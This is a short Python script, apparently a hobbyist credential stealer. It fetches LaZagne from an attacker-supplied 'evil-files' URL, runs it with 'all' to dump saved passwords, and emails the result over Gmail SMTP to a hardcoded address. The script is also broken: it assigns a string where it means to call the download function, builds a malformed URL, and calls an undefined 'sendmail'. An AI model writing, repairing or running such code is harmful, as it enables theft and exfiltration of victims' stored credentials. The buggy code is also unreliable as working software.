import requests,subprocess,smtplib

def download(url):
    get_response=requests.get(url)
    #print(get_response.content)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)   #smtp server interface
    server.starttls()
    server.login(email,password)
    server.sendmail(email,"kanavraina11@gmail.com",message)          #send_mail(from,to,message)
    server.quit()
ip=input("Enter your IP")
download=("https://"+ip+"evil-files/laZagne.exe")
result=subprocess.check_output("laZagne.exe all",shell=True)
mail=input("enter your email")
password=input("enter your password")
sendmail(mail,password,result)
